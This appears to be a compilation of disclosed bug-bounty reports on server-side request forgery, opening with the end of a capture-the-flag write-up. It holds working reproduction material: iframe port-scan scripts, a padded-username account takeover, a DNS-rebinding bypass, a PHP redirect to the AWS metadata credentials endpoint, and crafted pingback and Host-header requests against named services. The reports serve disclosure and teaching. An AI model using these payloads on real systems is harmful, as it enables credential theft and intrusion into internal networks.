Thanks to stored XSS via IDOR now we are able to fire SSRF on pdf generator but we are again limited since we can't access metadata to reveal SSH keys, only thing left to do was doing port scan, decided to use following script to scan local ports for any other web page.

```javascript
var i = 0;
var k = i + 500;
for (;i<k; i++){
 document.write("<br/><b>Port:"+i+"</b><iframe src='http://localhost:"+i+"' width='1000' height='300' frameBorder='0'></iframe><br/>");
}
```

I decided to scan 500 ports each time because when I added more pdf generation was failing so after some time I found out that Chrome's default remote debugging port (9222) was accessible, you can find outputs of the scan on {F692971}

{F692970}

Since we can access that decided to use following script for loading it on pdf:

```javascript
var i=9222;
document.write("<br/><b>Port:"+i+"</b><iframe src='http://localhost:"+i+"/json' width='1000' height='1000' frameBorder='0'></iframe><br/>");
```

{F692969}

Now I found out that `http://localhost:3000/login?secret_document=0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf`

Wanted to go for [this](https://h1-415.h1ctf.com/documents/0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf) web page since we could share documents with our friends according to Jobert's testimonial on login page.

`I love My Docz Converter! It's easy to use and secure. I can share documents with my friends.`

Flag was stored on it: **h1ctf{y3s_1m_c0sm1c_n0w}** {F692180}

## Journey of curiosity

Furthermore receiving flag for unintended account takeover: **h1ctf{wtf_1s_happ3ning_w1th_th1s_s1mulat1on}**

I decided to dig it more because it wasn't feeling correct and my curiosity was tempting me and applied same logic to username itself by using such request:
```
POST /register HTTP/1.1
Host: h1-415.h1ctf.com
Connection: close
Content-Length: 286
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://h1-415.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4017.0 Safari/537.36 Edg/81.0.389.2
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://h1-415.h1ctf.com/register
Accept-Encoding: gzip, deflate
Accept-Language: tr,en-US;q=0.9,en;q=0.8
Cookie: _csrf_token=48c181397836e88979a3dcbe000856320ec5f829; session=eyJfY3NyZl90b2tlbiI6IjQ4YzE4MTM5NzgzNmU4ODk3OWEzZGNiZTAwMDg1NjMyMGVjNWY4MjkifQ.Xijq_Q.v_EEgJoyHr08l8qoLb-v6A_izrI

name=test&email=2jt@jt.com&username=jobert+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++%0a&password=1test123456789&password-confirmation=1test123456789&_csrf_token=48c181397836e88979a3dcbe000856320ec5f829
```

Which actually worked and let me create a new account it's session cookie looks like this:

```
{'_csrf_token': '48c181397836e88979a3dcbe000856320ec5f829', 'chat': [], 'email': '2jt@jt.com', 'user_type': 3, 'username': 'jobert              '}
```
Apperantly backend was setting user_type by matching email address but not the username itself from the login, which explains all QR code stuff, then I logged with jobert's username confirmed it since it had trial tag on it.
{F693403}

First thing I tried changing name of user and I was actually able to do it then logged with jobert@mydocz.cosmic and confirmed that I was able to update name to Jobert2.

{F693402}

Secondly I tried to upload file on jobert's username and it was also successful

{F693400}

Again logged with jobert@mydocz.cosmic and verified it was also successful

{F693401}

It's also clear that username and documents assigned to userid itself unlike the access of users permissions, like jobert account with trial permissions couldn't interact with support despite being exact same userid with original jobert account.

It was really fun to find such stuff :).

## Closing thoughts

This CTF actually helped me to analyse things more better and stop overthinking, because sometimes we need to stop making assumptions and follow the flow of basic things. 

It was very well managed and fun challenges was there.

Hats off to Mr @0xacb a.k.a 2763 ;) and @nahamsec

I also would like to thank @Al-Madjus, @checkm50 and @manoelt from H101 discord for their time and letting me realize things more clearly.

Unfortunately I can not attend event, due to some family reasons. if I win via this write-up which I do not think, so please exclude me from that :)

I feel like c0sm1c now
{F693204}
## References
1. https://zxing.org/w/decode.jspx
1. https://www.the-qrcode-generator.com/
1. https://h1-415.h1ctf.com/js/support.min.js
1. https://raw.githack.com
1. https://mango.pdf.zone/stealing-chrome-cookies-without-a-password
1. https://h1-415.h1ctf.com/documents/0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf

---

### [SSRF  leaking internal google cloud data through upload function [SSH Keys, etc..]](https://hackerone.com/reports/549882)

- **Report ID:** `549882`
- **Severity:** Critical
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** Vimeo
- **Reporter:** @dphoeniixx
- **Bounty:** - usd
- **Disclosed:** 2019-12-13T18:54:51.985Z
- **CVE(s):** -

**Summary (team):**

Using our upload feature, the user was able to force an SSRF to occur.

**Summary (researcher):**

For more information you can read my writeup: https://medium.com/@dPhoeniixx/vimeo-upload-function-ssrf-7466d8630437

---

### [GitLab::UrlBlocker validation bypass leading to full Server Side Request Forgery](https://hackerone.com/reports/541169)

- **Report ID:** `541169`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** GitLab
- **Reporter:** @ajxchapman
- **Bounty:** - usd
- **Disclosed:** 2019-12-12T11:56:05.168Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary
The `GitLab::UrlBlocker` IP address validation methods suffer from a Time of Check to Time of Use (ToCToU) vulnerability. The vulnerability occurs due to multiple DNS resolution requests performed before and after the checks. This issue allows a malicious authenticated user to send GET and POST HTTP requests to arbitrary hosts, including the localhost, cloud metadata services and the local network, and read the HTTP response.

### Details
The IP address validation code in `/lib/gitlab/url_blocker.rb` resolves the IP addresses of the provided URL domain, raises an exception if the resolved IP addresses match addresses in block lists (`127.0.0.1`, `::1`, `169.254.0.0/16`, etc.) or returns `true` if the IP address do not match the block lists.
```ruby
  begin
    addrs_info = Addrinfo.getaddrinfo(uri.hostname, port, nil, :STREAM).map do |addr|
      addr.ipv6_v4mapped? ? addr.ipv6_to_ipv4 : addr
    end
  rescue SocketError
    return true
  end

  validate_localhost!(addrs_info) unless allow_localhost
  validate_loopback!(addrs_info) unless allow_localhost
  validate_local_network!(addrs_info) unless allow_local_network
  validate_link_local!(addrs_info) unless allow_local_network

  true
end
```
If the address validates the `GitLab::HTTP` code then uses `HTTParty` to request the URL, which performs a second URL domain DNS resolution. The address validation checks can be bypassed if the URL domain resolves to a valid address for the first resolution then a forbidden address after the checks are performed. 

In order to perform this attack a DNS server must be configured to resolve a domain to alternating addresses with a low (or zero) Time To Live. To demonstrate this issue I used my researchersservers project (https://github.com/ajxchapman/sshreverseshell) with the configuration in {F470655}. Output of resolving `gitlabextssrf.webhooks.pw` against this DNS resolver configuration is shown below:
```sh
$ dig +noall +answer gitlabextssrf.webhooks.pw
gitlabextssrf.webhooks.pw. 0    IN      A       198.211.125.160
$ dig +noall +answer gitlabextssrf.webhooks.pw
gitlabextssrf.webhooks.pw. 0    IN      A       198.211.125.160
$ dig +noall +answer gitlabextssrf.webhooks.pw
gitlabextssrf.webhooks.pw. 0    IN      A       127.0.0.1
$ dig +noall +answer gitlabextssrf.webhooks.pw
gitlabextssrf.webhooks.pw. 0    IN      A       127.0.0.1
$ dig +noall +answer gitlabextssrf.webhooks.pw
gitlabextssrf.webhooks.pw. 0    IN      A       198.211.125.160
```
Notice the alternating resolved IP address and 0 ttl.

### Attack scenario
Using the Web Hook integration functionality of a GitLab repository, this issue can be abused to send HTTP GET and POST requests to arbitrary IP addresses, with arbitrary path parameters. The following screenshot shows the response of an HTTP GET request to `http://169.254.169.254/metadata/v1.json` on a DigitalOcean droplet:
{F470641}

### Steps to reproduce
To demonstrate this issue I have configured the domain `gitladextssrf.webhooks.pw` to randomly resolve to either `198.211.125.160` or `127.0.0.1`.

1. Create a new repository
1. Add a commit to the repository
1. Create a new Web Hook integration with the URL http://gitlabextssrf.webhooks.pw:9999.
  * This may take several attempts due to the random nature of the `gitlabextssrf.webhooks.pw` DNS resolver, if it fails with a `500` error, try again until it is accepted.
1. Log into the gitlab server and start a TCP listener on port 9999/tcp (e.g. `nc -vvn -l -p 9999`)
1. Perform numerous parallel requests to the Web Hook test endpoint. For this I use `wfuzz`

```sh
$ ./wfuzz -X POST \
  -b "_gitlab_session=<session_id>;" \
  -d "_method=post&authenticity_token=<token>" \
  -z range,0-1000 \
  "https://<domain>/<user>/<repo>/hooks/<hook_id>/test?trigger=push_events&test=FUZZ"
```
The the below video demonstration of reproducing this issue:
{F470642}

After several requests a connection will be made to the local TCP listener on port 9999/tcp.

### Impact
This issue allows a malicious authenticated user to send GET and POST HTTP requests from the GitLab server to arbitrary hosts (including the localhost, cloud metadata services and the local network) with arbitrary paths, and read the HTTP response. This could be abused to compromise the host (e.g. leaking AWS tokens from the metadata service), or perform reconnaissance and exploitation of hosts on the local network.

### What is the current *bug* behavior?
The `GitLab::UrlBlocker` validation code resolves the IP addresses of a URL domain, validates them against a series of block lists, and if valid returns to the `GitLab::HTTP` module which re-resolves the URL domain in order to perform the HTTP request.

### What is the expected *correct* behavior?
The validated resolved addresses should be returned by `GitLab::UrlBlocker` and used by `GitLab::HTTP` to make the TCP connection to the destination host.

### Relevant logs and/or screenshots
Output of using the ToCToU bypass in a Web Hook to send a request to the DigitalOcean droplet meta data API `http://169.254.169.254/metadata/v1.json` endpoint:
{F470641}

### Output of checks
#### Results of GitLab environment info
```sh
$ gitlab-rake gitlab:env:info

System information
System:         Ubuntu 18.04
Proxy:          no
Current User:   git
Using RVM:      no
Ruby Version:   2.5.3p105
Gem Version:    2.7.6
Bundler Version:1.16.6
Rake Version:   12.3.2
Redis Version:  3.2.12
Git Version:    2.18.1
Sidekiq Version:5.2.5
Go Version:     unknown

GitLab information
Version:        11.9.8-ee
Revision:       c9701808101
Directory:      /opt/gitlab/embedded/service/gitlab-rails
DB Adapter:     postgresql
DB Version:     9.6.11
URL:            https://gitlabext.webhooks.pw
HTTP Clone URL: https://gitlabext.webhooks.pw/some-group/some-project.git
SSH Clone URL:  git@gitlabext.webhooks.pw:some-group/some-project.git
Elasticsearch:  no
Geo:            no
Using LDAP:     no
Using Omniauth: yes
Omniauth Providers:

GitLab Shell
Version:        8.7.1
Repository storage paths:
- default:      /var/opt/gitlab/git-data/repositories
GitLab Shell path:              /opt/gitlab/embedded/service/gitlab-shell
Git:            /opt/gitlab/embedded/bin/git
```

I have confirmed this issue on both the official Docker image and the official `gitlab-ee` Ubuntu package (using installation instructions from https://about.gitlab.com/install/#ubuntu).

## Impact

This issue allows a malicious authenticated user to send GET and POST HTTP requests from the GitLab server to arbitrary hosts (including the localhost, cloud metadata services and the local network) with arbitrary paths, and read the HTTP response. This could be abused to compromise the host (e.g. leaking AWS tokens from the metadata service), or perform reconnaissance and exploitation of hosts on the local network.

---

### [SSRF on ████████](https://hackerone.com/reports/406387)

- **Report ID:** `406387`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @twicedi
- **Bounty:** - usd
- **Disclosed:** 2019-10-08T18:45:21.526Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
The web application hosted on the "███████" domain is affected by a Server Side Request Forgery (SSRF) vulnerability that could allows an attacker to force the application to make requests to arbitrary targets.

**Description:**
The affected handler is the "/xmlrpc/pingback/".
This handler receives an xml payload containing an arbitrary URL. This parameter is then used by the application to send a request to the target.

The following request contains a valid target (for test purpose I have temporary generated the following domain: http://8hqzrzlvw4nabsf9bj3wgsl3vu1kp9.burpcollaborator.net/ with the Burp Collaborator tool):

```
POST /xmlrpc/pingback/ HTTP/1.1
Host: ███████
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: COOKIE_SUPPORT=true; GUEST_LANGUAGE_ID=en_US; ANONYMOUS_USER_ID=2922001
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 305

<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value>http://8hqzrzlvw4nabsf9bj3wgsl3vu1kp9.burpcollaborator.net/</value>
</param>
<param>
<value>https://████/web/guest/home/</value>
</param>
</params>
</methodCall>
```

Response:

```
HTTP/1.1 200 OK
Content-Type: text/xml;charset=UTF-8
Server: Microsoft-IIS/8.5
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1
X-Powered-By: ASP.NET
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Content-Length: 291
Date: Thu, 06 Sep 2018 07:34:54 GMT
Connection: close
Set-Cookie: JSESSIONID=3D2874915F19DB1CE69EBAE34C6F894C; Path=/; Secure; HttpOnly

<?xml version="1.0" encoding="UTF-8"?><methodResponse><fault><value><struct><member><name>faultCode</name><value><i4>17</i4></value></member><member><name>faultString</name><value><string>Could not find target URI in source</string></value></member></struct></value></fault></methodResponse>
```

If the response contains a "faultCode" with a value of 17 (<value><int>17</int></value>) then it means the port is open. In the following screenshot it is showed the log of the dns request sent by the DoD server.

██████

Instead by using a non-existent domain as target (http://non.existent/):

```
POST /xmlrpc/pingback/ HTTP/1.1
Host: ████
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: COOKIE_SUPPORT=true; GUEST_LANGUAGE_ID=en_US; ANONYMOUS_USER_ID=2922001
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 266

<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value>http://non.existent/</value>
</param>
<param>
<value>https://████████/web/guest/home/</value>
</param>
</params>
</methodCall>
```

The response contains a different "faultCode" with a different "faultString":

```
HTTP/1.1 200 OK
Content-Type: text/xml;charset=UTF-8
Server: Microsoft-IIS/8.5
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1
X-Powered-By: ASP.NET
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Content-Length: 282
Date: Thu, 06 Sep 2018 07:36:53 GMT
Connection: close
Set-Cookie: JSESSIONID=42FE4B60C1214FF84F72CFDD9E287A6C; Path=/; Secure; HttpOnly

<?xml version="1.0" encoding="UTF-8"?><methodResponse><fault><value><struct><member><name>faultCode</name><value><i4>16</i4></value></member><member><name>faultString</name><value><string>Error accessing source URI</string></value></member></struct></value></fault></methodResponse>
```

By exploiting this SSRF an attacker may be able to scan the local or external networks to which the vulnerable server is connected to. 


## Impact
The impact of exploiting a Server Side Request Forgery vulnerability mainly depends on how the web application uses the responses from the remote resource, such as:
- scan ports and IP addresses
- interact with some protocols such as Gopher
- discover the IP addresses of servers running behind a reverse proxy
- Denial of Services
- In some situation potentially remote code execution


## Step-by-step Reproduction Instructions

1. To exploit this issue an attacker has to craft a POST request, similar to the following, that contains the target URL:

```
POST /xmlrpc/pingback/ HTTP/1.1
Host: ████████
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: COOKIE_SUPPORT=true; GUEST_LANGUAGE_ID=en_US; ANONYMOUS_USER_ID=2922001
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 305

<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value>http://8hqzrzlvw4nabsf9bj3wgsl3vu1kp9.burpcollaborator.net/</value>
</param>
<param>
<value>https://█████/web/guest/home/</value>
</param>
</params>
</methodCall>
```


## Suggested Mitigation/Remediation Actions
To prevent SSRF vulnerabilities in your web applications it is strongly advised to use a whitelist of allowed domains and protocols from where the web server can fetch remote resources.
If possible avoid using user input directly in functions that can make requests on behalf of the server. 

I'm available for further clarification,

Best,
Davide

## Impact

The impact of exploiting a Server Side Request Forgery vulnerability mainly depends on how the web application uses the responses from the remote resource, such as:
- scan ports and IP addresses
- interact with some protocols such as Gopher
- discover the IP addresses of servers running behind a reverse proxy
- Denial of Services
- In some situation potentially remote code execution

---

### [https://████████ Impacted by DNN ImageHandler SSRF](https://hackerone.com/reports/482634)

- **Report ID:** `482634`
- **Severity:** Critical
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @warsong
- **Bounty:** - usd
- **Disclosed:** 2019-10-08T18:43:17.892Z
- **CVE(s):** -

**Vulnerability Information:**

Summary:
https://███████ runs DNN 8.0.0 to 9.1.1 and is impacted by CVE 2017-0929 allowing for a SSRF through the DNN ImageHandler. Origin servers will request any image file supplied by the attacker. This allows for internal NIPR sites to be mapped and accessed through a vulnerable host. The attack is limited by file extension.

Impact
Vulnerable site allows interaction with internal NIPR sites. Pulling default image files from internal NIPR sites verifies the site is online and responsive. Discloses origin IP addresses, and could be manipulated further.  This could also be used as a defacement technique making the sight display images of radical ideologies or pornography.  

Step-by-step Reproduction Instructions
Access the DNN image handler on the vulnerable site.
Supply Burp collaborator payload (working on free burp right now and cannot provide a collab payload) or external attacker controlled image for SSRF trigger.
Payload Example:
https://█████/DnnImageHandler.ashx?mode=file&url=http://1.bp.blogspot.com/-q19YK-T_wAU/UdpDm76jIgI/AAAAAAAAAWo/yjeRx4Vet80/s400/meme11.jpg

https://████████/DnnImageHandler.ashx?mode=file&url=http://www.███/data/uploads/images/DC3_seal.png

Product, Version, and Configuration
DNN 8.0.0 to 9.1.1 with ImageHandler exposed.

Suggested Mitigation/Remediation Actions
Upgrade to DNN 9.2.0 or later. If upgrading isn't possible, consider blocking requests to ImageHandler if it is unused.

## Impact

Recommend High Severity: Vulnerable site allows interaction with internal NIPR-Only sites. Pulling default image files from internal NIPR sites verifies the site is online and responsive. Discloses origin IP addresses, and could be manipulated further to cause harm on internal NIPR sites. This could also be used as a defacement technique making the sight display images of radical ideologies or pornography.

---

### [SSRF in webhooks leads to AWS private keys disclosure](https://hackerone.com/reports/508459)

- **Report ID:** `508459`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** Omise
- **Reporter:** @honoki
- **Bounty:** - usd
- **Disclosed:** 2019-06-28T06:49:12.422Z
- **CVE(s):** -

**Vulnerability Information:**

## Vulnerability Summary

Omise makes use of Amazon AWS as their application environment. Due to a vulnerability in the way webhooks are implemented, an attacker can make arbitrary HTTP/HTTPS requests from the application server and read their responses. This is known as a server-side request forgery (SSRF) vulnerability.

This vulnerability leads to access to Omise's Amazon EC2 instance with the user role `aws-opsworks-ec2-role`, including AWS private keys.

## Description

The vulnerability exists in the way webhooks follow redirects. In general, it appears that redirects are not followed, but a HTTP 303 See Other status code allows an attacker to bypass this restriction.

By pointing my webhook URL to a server that issues a 303 redirect, I am able to redirect and read the responses of arbitrary HTTP/HTTPS requests from the application server. E.g. the following PHP script results in a successful request that is followed by the server:

`<?php header('Location: http://<arbitrary-location>', TRUE, 303); ?>`

As a result, it is possible to request a number of things, including AWS credentials on the metadata server located at `http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-opsworks-ec2-role`

## Steps to reproduce

* Host the following payload on `https://<your-attacker-server>/redir.php`:

````
<?php header('Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-opsworks-ec2-role', TRUE, 303); ?>
````
* Point your webhook endpoint on https://dashboard.omise.co/test/webhooks/edit to `https://<your-attacker-server>/redir.php`
* Make a random call to the API, e.g. adding a user;
* View the "Recent Deliveries" of the webhook calls on https://dashboard.omise.co/test/webhooks
* Note the `200 OK` status code indicating a successful redirect
* Click the event to view the response body of the AWS metadata

## Recommendation

I recommend to ensure all input provided to the endpoint is validated. In this case, ensure that 303 redirects are not followed either.

I also recommend resetting all AWS access tokens. In addition, I recommend reviewing the Amazon access logs to investigate if this vulnerbility has been exploited in the past.

## Attachments

* **20190312_AWS-SSRF-303-redirect-2.png** - Screenshot showing the output of the AWS credentials obtained through the SSRF vulnerability.
* **20190312_AWS-SSRF-303-redirect.png** - Screenshot showing the output of the AWS index of metadata.

## Impact

By exploiting this vulnerability, an unauthorized attacker could gain access to the AWS environment of Omise. Note that the SSRF vulnerability could be abused in a variety of ways, not just limited to obtaining AWS credentials. For example, to enumerate and access services and web applications running on the internal network.

---

### [SSRF at ideas.starbucks.com](https://hackerone.com/reports/500468)

- **Report ID:** `500468`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** Starbucks
- **Reporter:** @damian89
- **Bounty:** - usd
- **Disclosed:** 2019-04-03T23:48:38.397Z
- **CVE(s):** -

**Summary (team):**

In this report, @damian89 identified a Server Side Request Forgery (SSRF) vulnerability on ideas.starbucks.com that allowed sending arbitrary HTTP requests and returned response bodies. The report went on to demonstrate how this flaw could be leveraged to use the vulnerable host as a proxy and identify, enumerate, and communicate with internal applications and infrastructure. @damian89's report was clear, thorough, and provided plenty of detail to help reproduce the issue as well as convey the potential impact of the finding. The high quality of the report ultimately helped make it possible to resolve the issue quickly. We hope to receive more reports from @damian89 in the future!

---

### [Unauthenticated blind SSRF in OAuth Jira authorization controller](https://hackerone.com/reports/398799)

- **Report ID:** `398799`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** GitLab
- **Reporter:** @jobert
- **Bounty:** 4000 usd
- **Disclosed:** 2019-03-14T16:28:39.097Z
- **CVE(s):** -

**Vulnerability Information:**

The `Oauth::Jira::AuthorizationsController#access_token` endpoint is vulnerable to a blind SSRF vulnerability. The vulnerability allows an attacker to make arbitrary HTTP/HTTPS requests inside a GitLab instance's network.

# Proof of concept
To reproduce the vulnerability, follow the steps below.

 - spin up a GitLab EE instance with the latest version (11.2.1-ee)
 - send a `POST` request to the `/-/jira/login/oauth/callback` endpoint, as shown below. In the request, point the `Host` header to the hostname / IP address and port number you want to send the request to:

```
curl -X POST -H 'Host: 162.243.147.21:81' 'https://gitlab.com/-/jira/login/oauth/access_token'
```

 - Observe a `POST` request being sent to `162.243.147.21:81` (in this case HTTPS):

```
Listening on [0.0.0.0] (family 0, port 81)
Connection from [35.231.137.154] port 81 [tcp/*] accepted (family 2, sport 58558)
��ؒ����
��/$����4�i�,�֟J%>�+�/�,�0�����#�'�	��$�(�
�gk39@j28��<=/5�l162.243.147.21

 Connection closed, listening again.
```

# Vulnerable code
The following code can be found in the `Oauth::Jira::AuthorizationsController#access_token` method.

```ruby
def access_token
  auth_params = params
                  .slice(:code, :client_id, :client_secret)
                  .merge(grant_type: 'authorization_code', redirect_uri: oauth_jira_callback_url)

  auth_response = Gitlab::HTTP.post(oauth_token_url, body: auth_params, allow_local_requests: true)
  token_type, scope, token = auth_response['token_type'], auth_response['scope'], auth_response['access_token']

  render text: "access_token=#{token}&scope=#{scope}&token_type=#{token_type}"
end
```

The `GItlab::HTTP.post` call is using the `oauth_token_url` directly. This `_url` Rails routing helper uses the `Host` header to construct the URL it needs to point to. Because every host is accepted in GitLab, the constructed URL can point to an internal system. This is how it's supposed to work. However, the `Host` header should be checked before making the `post` call to avoid an attacker being able to make arbitrary requests.

## Impact

The response of the server is actually interpreted, but this is limited to a JSON response that returns an `access_token`, `scope`, and `token_type`. However, this may have additional consequences in case there are unauthenticated endpoints within the instance's network. This isn't very likely, which is why the attack complexity is set to High. It has a minor impact on Availability, because a thread is blocked on the TCP read timeout, which is set to 60 seconds (`curl -X POST -H 'Host: 162.243.147.21:81'   0.03s user 0.01s system 0% cpu 1:00.76 total`). The integrity impact is currently set at High, but this depends on additional factors, such as what other internal services can be hit. The user does not need to be authenticated to execute the call.

---

### [Blind SSRF at https://chaturbate.com/notifications/update_push/](https://hackerone.com/reports/411865)

- **Report ID:** `411865`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** Chaturbate
- **Reporter:** @robin0oklay
- **Bounty:** - usd
- **Disclosed:** 2018-10-21T05:11:44.913Z
- **CVE(s):** -

**Vulnerability Information:**

In the application at https://chaturbate.com/notifications/update_push/ there is a functionality to subscribe any cam model which will trigger the provided request. Using this Request an attacker can execute SSRF attack and also steal sensitive Token / Keys of the internal web server

Steps to Replicate the submission:-

Login to your https://chaturbate.com/ account or use my account-
USERNAME-██████████
PASSWORD-███████

Now click on profile, or trigger any request so that you can get your Cookie / CSRF token.

Send any request to repeater and replace it with the provided request

POST /notifications/update_push/ HTTP/1.1
Host: chaturbate.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Referer: https://chaturbate.com/princesscin/
Content-Type: application/x-www-form-urlencoded
X-CSRFToken: YOURCSRFHERE
X-Requested-With: XMLHttpRequest
Content-Length: 408
Cookie: YOURCOOKIEHERE
Connection: close

subscription={"endpoint":"http:\/\/███\/wpush\/v2\/████&unsub=false

As you can see that I have changed the actual URL to my domain ████████, so that I can get the actual request send to the server.

Put your cookie and CSRF token (you can copy CSRF token from your cookies) over here and than send this request

Go to this URL to confirm SSRF at - http://████████████
you will find that your Crypto-Key, Encryption header and Authorization Header is getting leaked onto the Attackers malicious site.
These headers are very sensitive to be leaked and hence needs to be fixed as soon as possible.

##Note
The application do not require to send the URL along with the domain, it is secure to only send the Rest part of the URL and do not include the domain so that the attacker could not control the complete request.

Thanks

Regards
Robin Ooklay

## Impact

Using this Request an attacker can execute SSRF attack and also steal sensitive Token / Keys of the internal web server.

---

### [SSRF on duckduckgo.com/iu/](https://hackerone.com/reports/398641)

- **Report ID:** `398641`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** DuckDuckGo
- **Reporter:** @d0nut
- **Bounty:** - usd
- **Disclosed:** 2018-09-09T20:12:35.028Z
- **CVE(s):** -

**Vulnerability Information:**

Normally, a call to `https://duckduckgo.com/iu` contains a query parameter (`u`) with some path using the domain `yimg.com`. This call will succeed in most cases.
{F337121}

And if we change that path to something like `https://google.com` it's rejected.
{F337118}

However, it appears that the check that ensures that `yimg.com` is the target domain is solely based on whether or not that string appears in the url, independent of where. This means we can stuff it in a query parameter and bypass this check.

{F337120}

Furthermore, with this bypass we can hit localhost and perform a port scan (see [XSPA](https://indiatriks.blogspot.com/2012/07/xspa-cross-site-port-attack.html)). 

For example, I have been able to conclude that services are running on the following ports:
```
22
25
80
443
587
6380
6432
6767
6868
8000
```

Some of these services don't like talking HTTP (like `22` and `25`) so they never respond, but other services seem to talk HTTP and will return seemingly sensitive data about redis. 
For example:
`https://duckduckgo.com/iu/?u=http://127.0.0.1:6868%2fstatus%2f?q=http://yimg.com/` returns the following:
```
{
  "current_time": "2018-08-23T17:56:06",
  "deployment_environment": "prod",
  "redis_local_last_successful_ping": "2018-08-23T13:56:05",
  "redis_local_url": "redis://127.0.0.1:6380",
  "redis_regional_last_successful_ping": "2018-08-23T13:56:05",
  "redis_regional_url": "redis://cache-services.duckduckgo.com:6380",
  "stat_blocked_ips_removed_since_launch": 8787,
  "stat_blocked_ips_since_launch": 12185,
  "stat_ipset_blocks": 266,
  "stat_redis_local_messages_received": 3613,
  "stat_redis_regional_messages_received": 10211,
  "status": "up"
}
```

## Impact

This could be used to interact with services that are not intended to be exposed. This also enables an XSPA attack. Additionally, information disclosure about a redis service. 

Lastly, an attack on redis may be possible even though the requests seem restricted to http.

---

### [SSRF in proxy.duckduckgo.com via the image_host parameter](https://hackerone.com/reports/358119)

- **Report ID:** `358119`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** DuckDuckGo
- **Reporter:** @fpatrik
- **Bounty:** - usd
- **Disclosed:** 2018-08-15T14:46:32.647Z
- **CVE(s):** -

**Vulnerability Information:**

# Description

https://proxy.duckduckgo.com/iur/ endpoint is vulnerable to ssrf via image_host
get parameter.

## Vulnerable URL:
https://proxy.duckduckgo.com/iur/?f=1&image_host=https://tudomanyok.hu/

## Some internal URL:
https://proxy.duckduckgo.com/iur/?f=1&image_host=https://127.0.0.1:18091/
http://127.0.0.1:9998/
http://127.0.0.1:8092/
http://127.0.0.1:8091/

The only restriction that is there must be a http:// or https:// before the URL so you can't go with ssh://

# How to reporduce

1. Go to one of the internal urls and you will see that there is something (some url is only visible with view-source)
2. The best example is the  http://127.0.0.1:18091/ one if you will visit: view-source:https://proxy.duckduckgo.com/iur/?f=1&image_host=https://127.0.0.1:18091/ui/ that there is something called couchebase console. (only visible in view-source)

These are I think internal web ports because I wasn't able to go to these ports from the external proxy.duckduckgo.com url.

## Impact

Attacker can scan your internal network, finding internal port, and internal web applications

The hacker selected the **Server-Side Request Forgery (SSRF)** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:

**Can internal services be reached bypassing network access control?**
Yes

**What internal services were accessible?**
http://127.0.0.1:9998/
http://127.0.0.1:8092/
http://127.0.0.1:8091/
https://127.0.0.1:18091/
...

**Security Impact**
I was possible to reach internal services, however I didn't tested that is that important or not (because i didn't want to violate any law)

---

